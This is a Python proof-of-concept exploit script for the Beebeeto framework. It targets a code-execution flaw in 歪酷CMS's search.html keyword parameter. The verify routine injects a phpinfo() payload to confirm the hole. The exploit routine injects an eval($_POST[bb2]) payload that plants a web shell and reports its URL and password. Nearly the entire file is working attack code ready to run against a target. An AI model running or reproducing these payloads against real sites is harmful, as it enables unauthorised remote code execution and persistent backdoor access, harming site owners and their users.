#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0175',
            'name': '歪酷CMS /search.html?keyword 任意代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-12-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '歪酷CMS',
            'vul_version': ['*'],
            'type': 'Command Execution',
            'tag': ['歪酷CMS漏洞', '任意代码执行漏洞', '/search.html?keyword', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-048523',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php/search.html?keyword=%24{%40phpinfo()}'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(verify_url).read()
        if '<title>phpinfo()</title>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        payload = '/index.php/search.html?keyword=%24{%40eval($_POST[bb2])}%24{%40print(md5(123))}'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(verify_url).read()
        if '202cb962ac59075b964b07152d234b70' in content:
            args['success'] = True
            args['poc_ret']['webshell'] = verify_url
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())